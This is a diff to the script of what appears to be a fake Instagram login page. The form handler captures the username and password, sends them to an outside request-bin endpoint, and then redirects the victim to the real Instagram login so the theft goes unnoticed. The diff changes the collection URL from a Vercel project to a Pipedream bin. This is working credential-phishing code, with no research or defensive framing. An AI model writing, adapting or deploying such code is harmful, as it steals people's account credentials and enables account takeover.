@@ -43,13 +43,13 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     console.log('Username:', username);
     console.log('Password:', password);
 
-    // Send the credentials to your server
-    fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
+    // Send the credentials to Requestbin
+    fetch('https://eoj56v5yfq0z2cx.m.pipedream.net' , {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ username, password }),
+        body: JSON.stringify({ username, password}),
     })
     .then(response => response.json())
     .then(data => {
@@ -63,4 +63,5 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     // Optionally, redirect to the Instagram login page
     // Remove or modify this line if you don't want to redirect
     window.location.href = 'https://www.instagram.com/accounts/login/';
+    
 });
